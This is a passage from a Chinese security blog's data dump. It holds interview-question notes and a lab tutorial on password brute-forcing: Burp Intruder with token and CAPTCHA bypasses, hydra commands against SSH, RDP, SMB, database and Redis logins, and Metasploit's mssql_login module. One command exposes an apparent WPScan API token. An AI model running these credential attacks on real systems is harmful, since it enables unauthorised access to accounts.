要关注到哪几个方面？\n  - 进入一台机器后怎么判断是不是蜜罐\n- 防火墙设计\n- 护网蓝队主要工作\n- sql注入原理（越深越好，越底层越好）\n  - 防御手段\n  - 直接用预编译可以杜绝sql注入吗？\n- XSS和SQL注入相同点\n  - 挖掘XSS时候的测试思路\n  - 如果用的vue和react的框架，如何挖掘XSS\n  - 发现XSS以后，利用思路是什么\n  - 反射型XSS利用时怎么不让别人发现\n  - 写自己的JS的时候，有没有遇到防护手段，怎么绕过？\n  - HTTP与同源策略的限制\n- 信息收集以后要干什么\n- 碰到什么样的漏洞要具体关注一下\n- 利用漏洞最终是想达成什么条件\n- 内网横向的一般步骤\n- 找到域控之类的怎么拿的\n  - 没找到咋办\n- 除了渗透测试之外的安全方向\n- WAF发展的模式分哪几种\n- WAF和AI是否有结合的空间？要怎么处理呢\n  - 选择具体的算法和深度学习模型你选哪个\n- 前沿一些的领域有了解吗\n- 怎么获取这些咨询的\n- 编程功底怎么样\n  - 有参加过开源项目吗\n  - 列三个最常用的Python库\n  - Python3.7、3.6、3.8有什么区别\n  - 出现多版本冲突怎么解决\n- dockerfile会写吗\n  - 用docker解决什么问题\n  - 对有容器的系统来说，在安全上有什么额外的关注点\n- 算法和数据结构有印象吗\n- 计网和计组呢\n  - L3、L4、L7区别是什么\n  - DNS协议和TCP/IP协议区别是啥？有什么联系\n  - 手机点开微信到能加载消息加载成功，经过的网络协议有哪些\n  - ARM和x86有啥区别\n  - 现代计算机的设计理念\n- 用过AI工具吗？ChatGPT基本原理\n  - 类似LLM和NLP的区别和联系\n- 怎么拆解leader或者导师安排的任务\n  - 如果因为沟通延迟等原因，无法交付怎么和leader沟通\n- 反问\n\n被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。\n","source":"_posts/找工作之旅.md","raw":"---\ntitle: 找工作之旅\ntags:\n  - 网络安全\nhide: false\nabbrlink: 13584\ndate: 2025-03-03 23:26:55\n---\n\n## 2024-3-27\n\n### 长亭一面\n\n- 自我介绍\n- 了解常见的漏洞吗\n  - SQL注入啊，SSRF啊什么什么的讲了一通\n- SQL注入无回显的情况下怎么利用呢\n  - 讲了下盲注\n- 了解twos的一些漏洞吗\n  - 没听清，我一直读的唉唉艾斯（IIS）\n- 那你了解weblogic的一些漏洞吗\n  - 说了反序列化\n- 你做过web项目开发，讲讲\n  - 说了用springboot开发\n- 那你知道springboot的一些漏洞吗\n  - 说了个Framework反序列化漏洞，还有个Actuator泄露\n- Actuator泄露能展开讲讲吗\n  - 大概讲了下泄露了什么，怎么利用\n- 了解Java相关漏洞吗\n  - 说了shiro反序列化漏洞，说了下原理\n- 会追CC链吗\n  - 讲了CC3和一个CB链\n- 了解内存马吗\n  - 大致讲了下原理\n- 反问\n  - 公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）\n  - twos是什么（面试官讲了以后才知道就是IIS）\n\n长亭的效率是真的快，半小时就发二面通知了\n\n## 2023-3-29\n\n### 长亭二面\n\n- 自我介绍\n- 什么时间开始接触信息安全\n- 通过什么途径学习\n- 参加过哪些比赛，比较有名的\n- cert成员主要做什么\n- 测试对象\n- sql注入类型\n  - 盲注，堆叠啥的讲了一通\n- 特殊的注入\n  - 二次注入，宽字节注入\n- 你sql注入的一般流程\n  - 找注入点，fuzz过滤什么什么的。。。\n- 会用工具协助吗\n  - sqlmap\n- 浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的\n  - 按理解讲了一下，不知道对不对\n- sqlmap怎么对cookie进行注入\n  - 不会。。\n- 用过msf吗\n  - 讲了下对生成木马做源码级免杀，讲了一下原理\n- xss攻击原理\n  - 讲了一通\n- 怎么防御\n  - 黑白名单，输出编码，httponly\n- tcp三次握手\n- 大概意思是学习到哪了，只会web吗？\n  - 讲了下内网渗透\n- 性格咋样\n- 对网络安全的兴趣\n- 每天花多少学习网络安全\n- 护网了解吗\n- 网络安全其他分支进行过学习吗\n- 挖过src吗\n- 实战挖到过漏洞吗，讲下渗透测试经历\n  - 讲了一下博彩网站渗透\n- 印象深刻的一次ctf比赛\n  - 讲了一下天枢的一个题\n- 希望通过实习获得哪方面的提升\n- 反问\n  - 评价\n  - 工作模式和氛围\n- 后面紧接着就是hr面\n\n## 2024-4-2\n\n长亭oc\n\n## 2024-11-19\n\n### 腾讯一面\n\nlc4t学长的部门\n\n- 自我介绍\n- 介绍渗透测试思路\n- 指纹识别框架包含什么\n  - 关注哪些细节\n  - 识别工具原理\n- 常见备份文件或敏感目录以及用来做什么\n  - 自己的小技巧\n- 其他信息收集需要关注的信息和资产\n- 详细介绍蜜罐做的哪部分环节和工作\n  - 要关注到哪几个方面？\n  - 进入一台机器后怎么判断是不是蜜罐\n- 防火墙设计\n- 护网蓝队主要工作\n- sql注入原理（越深越好，越底层越好）\n  - 防御手段\n  - 直接用预编译可以杜绝sql注入吗？\n- XSS和SQL注入相同点\n  - 挖掘XSS时候的测试思路\n  - 如果用的vue和react的框架，如何挖掘XSS\n  - 发现XSS以后，利用思路是什么\n  - 反射型XSS利用时怎么不让别人发现\n  - 写自己的JS的时候，有没有遇到防护手段，怎么绕过？\n  - HTTP与同源策略的限制\n- 信息收集以后要干什么\n- 碰到什么样的漏洞要具体关注一下\n- 利用漏洞最终是想达成什么条件\n- 内网横向的一般步骤\n- 找到域控之类的怎么拿的\n  - 没找到咋办\n- 除了渗透测试之外的安全方向\n- WAF发展的模式分哪几种\n- WAF和AI是否有结合的空间？要怎么处理呢\n  - 选择具体的算法和深度学习模型你选哪个\n- 前沿一些的领域有了解吗\n- 怎么获取这些咨询的\n- 编程功底怎么样\n  - 有参加过开源项目吗\n  - 列三个最常用的Python库\n  - Python3.7、3.6、3.8有什么区别\n  - 出现多版本冲突怎么解决\n- dockerfile会写吗\n  - 用docker解决什么问题\n  - 对有容器的系统来说，在安全上有什么额外的关注点\n- 算法和数据结构有印象吗\n- 计网和计组呢\n  - L3、L4、L7区别是什么\n  - DNS协议和TCP/IP协议区别是啥？有什么联系\n  - 手机点开微信到能加载消息加载成功，经过的网络协议有哪些\n  - ARM和x86有啥区别\n  - 现代计算机的设计理念\n- 用过AI工具吗？ChatGPT基本原理\n  - 类似LLM和NLP的区别和联系\n- 怎么拆解leader或者导师安排的任务\n  - 如果因为沟通延迟等原因，无法交付怎么和leader沟通\n- 反问\n\n被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。\n","slug":"找工作之旅","published":1,"updated":"2025-03-04T14:36:47.271Z","comments":1,"layout":"post","photos":[],"_id":"cm8d9pkht0009lsjfdpif0tw6","content":"<h2 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024-3-27\"></a>2024-3-27</h2><h3 id=\"长亭一面\"><a href=\"#长亭一面\" class=\"headerlink\" title=\"长亭一面\"></a>长亭一面</h3><ul>\n<li>自我介绍</li>\n<li>了解常见的漏洞吗<ul>\n<li>SQL注入啊，SSRF啊什么什么的讲了一通</li>\n</ul>\n</li>\n<li>SQL注入无回显的情况下怎么利用呢<ul>\n<li>讲了下盲注</li>\n</ul>\n</li>\n<li>了解twos的一些漏洞吗<ul>\n<li>没听清，我一直读的唉唉艾斯（IIS）</li>\n</ul>\n</li>\n<li>那你了解weblogic的一些漏洞吗<ul>\n<li>说了反序列化</li>\n</ul>\n</li>\n<li>你做过web项目开发，讲讲<ul>\n<li>说了用springboot开发</li>\n</ul>\n</li>\n<li>那你知道springboot的一些漏洞吗<ul>\n<li>说了个Framework反序列化漏洞，还有个Actuator泄露</li>\n</ul>\n</li>\n<li>Actuator泄露能展开讲讲吗<ul>\n<li>大概讲了下泄露了什么，怎么利用</li>\n</ul>\n</li>\n<li>了解Java相关漏洞吗<ul>\n<li>说了shiro反序列化漏洞，说了下原理</li>\n</ul>\n</li>\n<li>会追CC链吗<ul>\n<li>讲了CC3和一个CB链</li>\n</ul>\n</li>\n<li>了解内存马吗<ul>\n<li>大致讲了下原理</li>\n</ul>\n</li>\n<li>反问<ul>\n<li>公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）</li>\n<li>twos是什么（面试官讲了以后才知道就是IIS）</li>\n</ul>\n</li>\n</ul>\n<p>长亭的效率是真的快，半小时就发二面通知了</p>\n<h2 id=\"2023-3-29\"><a href=\"#2023-3-29\" class=\"headerlink\" title=\"2023-3-29\"></a>2023-3-29</h2><h3 id=\"长亭二面\"><a href=\"#长亭二面\" class=\"headerlink\" title=\"长亭二面\"></a>长亭二面</h3><ul>\n<li>自我介绍</li>\n<li>什么时间开始接触信息安全</li>\n<li>通过什么途径学习</li>\n<li>参加过哪些比赛，比较有名的</li>\n<li>cert成员主要做什么</li>\n<li>测试对象</li>\n<li>sql注入类型<ul>\n<li>盲注，堆叠啥的讲了一通</li>\n</ul>\n</li>\n<li>特殊的注入<ul>\n<li>二次注入，宽字节注入</li>\n</ul>\n</li>\n<li>你sql注入的一般流程<ul>\n<li>找注入点，fuzz过滤什么什么的。。。</li>\n</ul>\n</li>\n<li>会用工具协助吗<ul>\n<li>sqlmap</li>\n</ul>\n</li>\n<li>浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的<ul>\n<li>按理解讲了一下，不知道对不对</li>\n</ul>\n</li>\n<li>sqlmap怎么对cookie进行注入<ul>\n<li>不会。。</li>\n</ul>\n</li>\n<li>用过msf吗<ul>\n<li>讲了下对生成木马做源码级免杀，讲了一下原理</li>\n</ul>\n</li>\n<li>xss攻击原理<ul>\n<li>讲了一通</li>\n</ul>\n</li>\n<li>怎么防御<ul>\n<li>黑白名单，输出编码，httponly</li>\n</ul>\n</li>\n<li>tcp三次握手</li>\n<li>大概意思是学习到哪了，只会web吗？<ul>\n<li>讲了下内网渗透</li>\n</ul>\n</li>\n<li>性格咋样</li>\n<li>对网络安全的兴趣</li>\n<li>每天花多少学习网络安全</li>\n<li>护网了解吗</li>\n<li>网络安全其他分支进行过学习吗</li>\n<li>挖过src吗</li>\n<li>实战挖到过漏洞吗，讲下渗透测试经历<ul>\n<li>讲了一下博彩网站渗透</li>\n</ul>\n</li>\n<li>印象深刻的一次ctf比赛<ul>\n<li>讲了一下天枢的一个题</li>\n</ul>\n</li>\n<li>希望通过实习获得哪方面的提升</li>\n<li>反问<ul>\n<li>评价</li>\n<li>工作模式和氛围</li>\n</ul>\n</li>\n<li>后面紧接着就是hr面</li>\n</ul>\n<h2 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024-4-2\"></a>2024-4-2</h2><p>长亭oc</p>\n<h2 id=\"2024-11-19\"><a href=\"#2024-11-19\" class=\"headerlink\" title=\"2024-11-19\"></a>2024-11-19</h2><h3 id=\"腾讯一面\"><a href=\"#腾讯一面\" class=\"headerlink\" title=\"腾讯一面\"></a>腾讯一面</h3><p>lc4t学长的部门</p>\n<ul>\n<li>自我介绍</li>\n<li>介绍渗透测试思路</li>\n<li>指纹识别框架包含什么<ul>\n<li>关注哪些细节</li>\n<li>识别工具原理</li>\n</ul>\n</li>\n<li>常见备份文件或敏感目录以及用来做什么<ul>\n<li>自己的小技巧</li>\n</ul>\n</li>\n<li>其他信息收集需要关注的信息和资产</li>\n<li>详细介绍蜜罐做的哪部分环节和工作<ul>\n<li>要关注到哪几个方面？</li>\n<li>进入一台机器后怎么判断是不是蜜罐</li>\n</ul>\n</li>\n<li>防火墙设计</li>\n<li>护网蓝队主要工作</li>\n<li>sql注入原理（越深越好，越底层越好）<ul>\n<li>防御手段</li>\n<li>直接用预编译可以杜绝sql注入吗？</li>\n</ul>\n</li>\n<li>XSS和SQL注入相同点<ul>\n<li>挖掘XSS时候的测试思路</li>\n<li>如果用的vue和react的框架，如何挖掘XSS</li>\n<li>发现XSS以后，利用思路是什么</li>\n<li>反射型XSS利用时怎么不让别人发现</li>\n<li>写自己的JS的时候，有没有遇到防护手段，怎么绕过？</li>\n<li>HTTP与同源策略的限制</li>\n</ul>\n</li>\n<li>信息收集以后要干什么</li>\n<li>碰到什么样的漏洞要具体关注一下</li>\n<li>利用漏洞最终是想达成什么条件</li>\n<li>内网横向的一般步骤</li>\n<li>找到域控之类的怎么拿的<ul>\n<li>没找到咋办</li>\n</ul>\n</li>\n<li>除了渗透测试之外的安全方向</li>\n<li>WAF发展的模式分哪几种</li>\n<li>WAF和AI是否有结合的空间？要怎么处理呢<ul>\n<li>选择具体的算法和深度学习模型你选哪个</li>\n</ul>\n</li>\n<li>前沿一些的领域有了解吗</li>\n<li>怎么获取这些咨询的</li>\n<li>编程功底怎么样<ul>\n<li>有参加过开源项目吗</li>\n<li>列三个最常用的Python库</li>\n<li>Python3.7、3.6、3.8有什么区别</li>\n<li>出现多版本冲突怎么解决</li>\n</ul>\n</li>\n<li>dockerfile会写吗<ul>\n<li>用docker解决什么问题</li>\n<li>对有容器的系统来说，在安全上有什么额外的关注点</li>\n</ul>\n</li>\n<li>算法和数据结构有印象吗</li>\n<li>计网和计组呢<ul>\n<li>L3、L4、L7区别是什么</li>\n<li>DNS协议和TCP/IP协议区别是啥？有什么联系</li>\n<li>手机点开微信到能加载消息加载成功，经过的网络协议有哪些</li>\n<li>ARM和x86有啥区别</li>\n<li>现代计算机的设计理念</li>\n</ul>\n</li>\n<li>用过AI工具吗？ChatGPT基本原理<ul>\n<li>类似LLM和NLP的区别和联系</li>\n</ul>\n</li>\n<li>怎么拆解leader或者导师安排的任务<ul>\n<li>如果因为沟通延迟等原因，无法交付怎么和leader沟通</li>\n</ul>\n</li>\n<li>反问</li>\n</ul>\n<p>被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。</p>\n","length":1659,"excerpt":"","more":"<h2 id=\"2024-3-27\"><a href=\"#2024-3-27\" class=\"headerlink\" title=\"2024-3-27\"></a>2024-3-27</h2><h3 id=\"长亭一面\"><a href=\"#长亭一面\" class=\"headerlink\" title=\"长亭一面\"></a>长亭一面</h3><ul>\n<li>自我介绍</li>\n<li>了解常见的漏洞吗<ul>\n<li>SQL注入啊，SSRF啊什么什么的讲了一通</li>\n</ul>\n</li>\n<li>SQL注入无回显的情况下怎么利用呢<ul>\n<li>讲了下盲注</li>\n</ul>\n</li>\n<li>了解twos的一些漏洞吗<ul>\n<li>没听清，我一直读的唉唉艾斯（IIS）</li>\n</ul>\n</li>\n<li>那你了解weblogic的一些漏洞吗<ul>\n<li>说了反序列化</li>\n</ul>\n</li>\n<li>你做过web项目开发，讲讲<ul>\n<li>说了用springboot开发</li>\n</ul>\n</li>\n<li>那你知道springboot的一些漏洞吗<ul>\n<li>说了个Framework反序列化漏洞，还有个Actuator泄露</li>\n</ul>\n</li>\n<li>Actuator泄露能展开讲讲吗<ul>\n<li>大概讲了下泄露了什么，怎么利用</li>\n</ul>\n</li>\n<li>了解Java相关漏洞吗<ul>\n<li>说了shiro反序列化漏洞，说了下原理</li>\n</ul>\n</li>\n<li>会追CC链吗<ul>\n<li>讲了CC3和一个CB链</li>\n</ul>\n</li>\n<li>了解内存马吗<ul>\n<li>大致讲了下原理</li>\n</ul>\n</li>\n<li>反问<ul>\n<li>公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）</li>\n<li>twos是什么（面试官讲了以后才知道就是IIS）</li>\n</ul>\n</li>\n</ul>\n<p>长亭的效率是真的快，半小时就发二面通知了</p>\n<h2 id=\"2023-3-29\"><a href=\"#2023-3-29\" class=\"headerlink\" title=\"2023-3-29\"></a>2023-3-29</h2><h3 id=\"长亭二面\"><a href=\"#长亭二面\" class=\"headerlink\" title=\"长亭二面\"></a>长亭二面</h3><ul>\n<li>自我介绍</li>\n<li>什么时间开始接触信息安全</li>\n<li>通过什么途径学习</li>\n<li>参加过哪些比赛，比较有名的</li>\n<li>cert成员主要做什么</li>\n<li>测试对象</li>\n<li>sql注入类型<ul>\n<li>盲注，堆叠啥的讲了一通</li>\n</ul>\n</li>\n<li>特殊的注入<ul>\n<li>二次注入，宽字节注入</li>\n</ul>\n</li>\n<li>你sql注入的一般流程<ul>\n<li>找注入点，fuzz过滤什么什么的。。。</li>\n</ul>\n</li>\n<li>会用工具协助吗<ul>\n<li>sqlmap</li>\n</ul>\n</li>\n<li>浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的<ul>\n<li>按理解讲了一下，不知道对不对</li>\n</ul>\n</li>\n<li>sqlmap怎么对cookie进行注入<ul>\n<li>不会。。</li>\n</ul>\n</li>\n<li>用过msf吗<ul>\n<li>讲了下对生成木马做源码级免杀，讲了一下原理</li>\n</ul>\n</li>\n<li>xss攻击原理<ul>\n<li>讲了一通</li>\n</ul>\n</li>\n<li>怎么防御<ul>\n<li>黑白名单，输出编码，httponly</li>\n</ul>\n</li>\n<li>tcp三次握手</li>\n<li>大概意思是学习到哪了，只会web吗？<ul>\n<li>讲了下内网渗透</li>\n</ul>\n</li>\n<li>性格咋样</li>\n<li>对网络安全的兴趣</li>\n<li>每天花多少学习网络安全</li>\n<li>护网了解吗</li>\n<li>网络安全其他分支进行过学习吗</li>\n<li>挖过src吗</li>\n<li>实战挖到过漏洞吗，讲下渗透测试经历<ul>\n<li>讲了一下博彩网站渗透</li>\n</ul>\n</li>\n<li>印象深刻的一次ctf比赛<ul>\n<li>讲了一下天枢的一个题</li>\n</ul>\n</li>\n<li>希望通过实习获得哪方面的提升</li>\n<li>反问<ul>\n<li>评价</li>\n<li>工作模式和氛围</li>\n</ul>\n</li>\n<li>后面紧接着就是hr面</li>\n</ul>\n<h2 id=\"2024-4-2\"><a href=\"#2024-4-2\" class=\"headerlink\" title=\"2024-4-2\"></a>2024-4-2</h2><p>长亭oc</p>\n<h2 id=\"2024-11-19\"><a href=\"#2024-11-19\" class=\"headerlink\" title=\"2024-11-19\"></a>2024-11-19</h2><h3 id=\"腾讯一面\"><a href=\"#腾讯一面\" class=\"headerlink\" title=\"腾讯一面\"></a>腾讯一面</h3><p>lc4t学长的部门</p>\n<ul>\n<li>自我介绍</li>\n<li>介绍渗透测试思路</li>\n<li>指纹识别框架包含什么<ul>\n<li>关注哪些细节</li>\n<li>识别工具原理</li>\n</ul>\n</li>\n<li>常见备份文件或敏感目录以及用来做什么<ul>\n<li>自己的小技巧</li>\n</ul>\n</li>\n<li>其他信息收集需要关注的信息和资产</li>\n<li>详细介绍蜜罐做的哪部分环节和工作<ul>\n<li>要关注到哪几个方面？</li>\n<li>进入一台机器后怎么判断是不是蜜罐</li>\n</ul>\n</li>\n<li>防火墙设计</li>\n<li>护网蓝队主要工作</li>\n<li>sql注入原理（越深越好，越底层越好）<ul>\n<li>防御手段</li>\n<li>直接用预编译可以杜绝sql注入吗？</li>\n</ul>\n</li>\n<li>XSS和SQL注入相同点<ul>\n<li>挖掘XSS时候的测试思路</li>\n<li>如果用的vue和react的框架，如何挖掘XSS</li>\n<li>发现XSS以后，利用思路是什么</li>\n<li>反射型XSS利用时怎么不让别人发现</li>\n<li>写自己的JS的时候，有没有遇到防护手段，怎么绕过？</li>\n<li>HTTP与同源策略的限制</li>\n</ul>\n</li>\n<li>信息收集以后要干什么</li>\n<li>碰到什么样的漏洞要具体关注一下</li>\n<li>利用漏洞最终是想达成什么条件</li>\n<li>内网横向的一般步骤</li>\n<li>找到域控之类的怎么拿的<ul>\n<li>没找到咋办</li>\n</ul>\n</li>\n<li>除了渗透测试之外的安全方向</li>\n<li>WAF发展的模式分哪几种</li>\n<li>WAF和AI是否有结合的空间？要怎么处理呢<ul>\n<li>选择具体的算法和深度学习模型你选哪个</li>\n</ul>\n</li>\n<li>前沿一些的领域有了解吗</li>\n<li>怎么获取这些咨询的</li>\n<li>编程功底怎么样<ul>\n<li>有参加过开源项目吗</li>\n<li>列三个最常用的Python库</li>\n<li>Python3.7、3.6、3.8有什么区别</li>\n<li>出现多版本冲突怎么解决</li>\n</ul>\n</li>\n<li>dockerfile会写吗<ul>\n<li>用docker解决什么问题</li>\n<li>对有容器的系统来说，在安全上有什么额外的关注点</li>\n</ul>\n</li>\n<li>算法和数据结构有印象吗</li>\n<li>计网和计组呢<ul>\n<li>L3、L4、L7区别是什么</li>\n<li>DNS协议和TCP&#x2F;IP协议区别是啥？有什么联系</li>\n<li>手机点开微信到能加载消息加载成功，经过的网络协议有哪些</li>\n<li>ARM和x86有啥区别</li>\n<li>现代计算机的设计理念</li>\n</ul>\n</li>\n<li>用过AI工具吗？ChatGPT基本原理<ul>\n<li>类似LLM和NLP的区别和联系</li>\n</ul>\n</li>\n<li>怎么拆解leader或者导师安排的任务<ul>\n<li>如果因为沟通延迟等原因，无法交付怎么和leader沟通</li>\n</ul>\n</li>\n<li>反问</li>\n</ul>\n<p>被狠狠地拷打了，问题都问的比较深，真真切切体现出我的学习情况，对于漏洞都没有深挖，导致稍微问深一点就答不上了。还有就是面试能力太差，经常出现大脑一片空白。这次面试也是给了我一个警醒。</p>\n"},{"title":"穷举","hide":false,"date":"2025-03-12T13:35:26.000Z","_content":"\n\n\n> 本文出现域名均为搭建的本地靶场域名\n\n## 1 概述\n\n​\t穷举就是枚举的意思，在互联网的今天，需要使用某种的服务，大多数都需要口令登录，这个口令就是密码，密码的强度分为，弱口令、中度口令、强度口令。如果登录的服务为弱口令，那会存在很大的安全隐患，黑客通过穷举弱口令对服务进行攻击，很容易就得到登录密码。得到密码之后就能登录服务，进行其他危害较大得操作。黑客也能通过对用户得信息整理，组合密码进行穷举攻击。例如根据用户的生日号码，出身年月日和姓名进行口令组合，再对其服务进行穷举。\n\n**常见服务**\n\n| 服务                    | 端口  |\n| ----------------------- | ----- |\n| web                     | 80    |\n| mysql                   | 3306  |\n| Microsoft SQL Server    | 1433  |\n| https                   | 443   |\n| ftp                     | 21    |\n| ssh                     | 22    |\n| dns                     | 53    |\n| tomcat                  | 8080  |\n| redis                   | 6379  |\n| rsync                   | 873   |\n| PostgreSQL              | 5432  |\n| cobaltstrike teamserver | 50050 |\n| smtp                    | 25    |\n| pop3                    | 110   |\n| 远程终端rdp             | 3389  |\n| smb                     | 445   |\n| rpc                     | 135   |\n| imap                    | 143   |\n| NetBIOS                 | 139   |\n| SMTPS                   | 465   |\n| POP3S                   | 995   |\n| mogodb                  | 27018 |\n| memcached               | 11211 |\n| telnet                  | 23    |\n| oracle                  | 1521  |\n\n\n\n## 2 burpsuite穷举后台密码\n\n抓包，然后放到Intruder模块，添加payload位置\n\n![image-20250312225424438](穷举/image-20250312225424438.png)\n\n加载payloads\n\n![image-20250312225451754](穷举/image-20250312225451754.png)\n\n开始攻击，爆破出密码\n\n![image-20250312225540034](穷举/image-20250312225540034.png)\n\n成功登录后台\n\n![image-20250312225644180](穷举/image-20250312225644180.png)\n\n\n\n## 3 带有Token防御的穷举爆破\n\n有的网站存在一次性Token，再用过一次后就失效了，导致没办法爆破\n\n![image-20250312230827144](穷举/image-20250312230827144.png)\n\n这里可以使用burpsuite的宏设置，打开`Settings`中的`Session`。\n\n![image-20250312231604753](穷举/image-20250312231604753.png)\n\n添加规则，选择运行宏。\n\n![image-20250312231626743](穷举/image-20250312231626743.png)\n\n选择添加宏\n\n![image-20250312231721421](穷举/image-20250312231721421.png)\n\n这里选择包含Token的响应\n\n![image-20250312231837586](穷举/image-20250312231837586.png)\n\n选择项目设置，在自定义参数位置添加，选择要获取的参数，这里要注意**参数名一定要一致**\n\n![image-20250312232023480](穷举/image-20250312232023480.png)\n\n一通确认，将更改参数名设置一下\n\n![image-20250312232151766](穷举/image-20250312232151766.png)\n\n可以更改一下作用范围\n\n![image-20250312232336232](穷举/image-20250312232336232.png)\n\n然后就可以开始爆破了，不过还是会有一些几率替换失败，感觉是爆破线程过高的原因，调低线程以后爆破成功了。\n\n![image-20250312233222030](穷举/image-20250312233222030.png)\n\n\n## 4 针对有验证码的穷举爆破\n\n### 4.1 Cookie不存在不验证绕过\n\n在请求包Cookie中存在字段`PHPSESSID`\n\n![image-20250312234452887](穷举/image-20250312234452887.png)\n\n其值其实对应于一个文件\n\n![image-20250312234548755](穷举/image-20250312234548755.png)\n\n这里如果对其没有验证，则可以删除`PHPSESSID`实现绕过，爆破成功\n\n![image-20250312234722354](穷举/image-20250312234722354.png)\n\n![image-20250312234834804](穷举/image-20250312234834804.png)\n\n### 4.2 后台验证码不销毁绕过\n\n有的网站验证码在使用后不会销毁，可以复用，达到绕过\n\n![image-20250312235311801](穷举/image-20250312235311801.png)\n\n![image-20250312235427207](穷举/image-20250312235427207.png)\n\n### 4.3 验证码识别爆破\n\n使用验证码识别工具，直接识别出验证码值，进行爆破\n\n![image-20250313000046133](穷举/image-20250313000046133.png)\n\n这里正常抓包，添加爆破位置，添加验证码路径，载入字典即可，在载入字典时需修改`Line Endings`为`Windows`，不然字典导不进去\n\n![image-20250313000648523](穷举/image-20250313000648523.png)\n\n![image-20250313001039560](穷举/image-20250313001039560.png)\n\n填写验证码错误信息，即可开始爆破\n\n![image-20250313001105420](穷举/image-20250313001105420.png)\n\n\n\n## 5 一些常见软件登录穷举\n\n### 5.1 phpmyadmin\n\n通常爆破`admin`，`root`，`test`用户密码\n\n![image-20250317212314918](穷举/image-20250317212314918.png)\n\n[下载地址](https://bbs.kanxue.com/thread-159062.htm)\n\n\n\n### 5.2 WordPress\n\n可以拼接路径，查看账户信息`/wp-json/wp/v2/users`\n\n![image-20250317215045138](穷举/image-20250317215045138.png)\n\n使用`WPScan`工具，首先在[WPScan](https://wpscan.com/)注册账户获取`token`，使用以下命令\n\n```bash\n$ wpscan --url http://xxx.com -e u -P ./top1000.txt --api-token 6qGDsJorRIvSazNIg9s4mwjxX8nOUPRL3to6fdJgwoo\n```\n\n![image-20250317215215191](穷举/image-20250317215215191.png)\n\n## 6 hydra工具使用\n\n```bash\n-l login 小写，指定用户名进行破解\n-L file 大写，指定用户的用户名字典\n-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。\n-P file 大写，用于指定密码字典。\n-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探\n-M file 指定目标ip列表文件，批量破解。\n-o file 指定结果输出文件\n-f 找到第一对登录名或者密码的时候中止破解。\n-t tasks 同时运行的线程数，默认是16\n-w time 设置最大超时时间，单位\n-v / -V 显示详细过程\n-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）\n-x 自定义密码\n```\n\n\n\n### 6.1 ssh\n\n**配置Ubuntu root用户ssh登录**\n\n```bash\n$ sudo apt install openssh-server # 安装ssh\n$ sudo nano /etc/ssh/sshd_config\n# PermitRootLogin prohibit-password ——> PermitRootLogin yes\n$ sudo service ssh restart # 重启ssh服务\n```\n\n使用`hydra`对ssh密码进行爆破\n\n```bash\n$ hydra -l root -P ./top500.txt -e ns -vV -t 1 -f 192.168.31.50 ssh\n```\n\n![image-20250317232800500](穷举/image-20250317232800500.png)\n\n### 6.2 ftp\n\n```bash\n$ hydra -l c5moon -P ./top500.txt -e ns -vV 192.168.31.51 ftp\n```\n\n![image-20250317233427264](穷举/image-20250317233427264.png)\n\n### 6.3 mysql\n\n```bash\n$ hydra -l root -P ./top500.txt -e ns -vV -f 192.168.31.57 mysql\n```\n\n![image-20250317233635882](穷举/image-20250317233635882.png)\n\n### 6.4 smb\n\n```bash\n$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 smb\n```\n\n![image-20250317234038917](穷举/image-20250317234038917.png)\n\n### 6.5 rdp\n\n```bash\n$ hydra -l administrator -P ./top500.txt -e ns -vV -f 192.168.31.57 rdp\n```\n\n![image-20250317234329708](穷举/image-20250317234329708.png)\n\n### 6.6 http\n\n```bash\n$ hydra -l admin -P ./top500.txt -vV -f www.c1moon.com http-post-form \"/admin/index.php:user=^USER^&ps=^PASS^&action=login:login-error\"\n```\n\n![image-20250317235246581](穷举/image-20250317235246581.png)\n\n### 6.7 mssql\n\n```bash\n$ hydra -l sa -P ./top500.txt -e ns -vV -f 192.168.31.57 mssql\n```\n\n![image-20250317235614010](穷举/image-20250317235614010.png)\n\n### 6.8 redis\n\n```bash\n$ hydra -P ./top500.txt -e ns -vV -f 192.168.31.57 redis\n```\n\n![image-20250317235842515](穷举/image-20250317235842515.png)\n\n## 7 metasploite穷举模块\n\n```bash\n$ msfconsole # 启动msf\n\nmsf6 > search auxiliary/scanner/mssql/mssql_login # 搜索模块\n\nMatching Modules\n================\n\n   #  Name                                 Disclosure Date  Rank    Check  Description\n   -  ----                                 ---------------  ----    -----  -----------\n   0  auxiliary/scanner/mssql/mssql_login  .                normal  No     MSSQL Login Utility\n\n\nInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mssql/mssql_login\n\nmsf6 > use auxiliary/scanner/mssql/mssql_login # 使用模块\n[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session\n\nmsf6 auxiliary(scanner/mssql/mssql_login) > info # 查看模块信息\n```\n\n![image-20250318000514529](穷举/image-20250318000514529.png)\n\n```bash\nmsf6 auxiliary(scanner/mssql/mssql_login) > show options # 显示参数\n```\n\n![image-20250318001134113](穷举/image-20250318001134113.png)\n\n```bash\nmsf6 auxiliary(scanner/mssql/mssql_login) > set RHOSTS 192.168.31.57\nRHOSTS => 192.168.31.57\nmsf6 auxiliary(scanner/mssql/mssql_login) > set STOP_ON_SUCCESS true\nSTOP_ON_SUCCESS => true\nmsf6 auxiliary(scanner/mssql/mssql_login) > set PASS_FILE ./top500.txt\nPASS_FILE => ./top500.txt\nmsf6 auxiliary(scanner/mssql/mssql_login) > 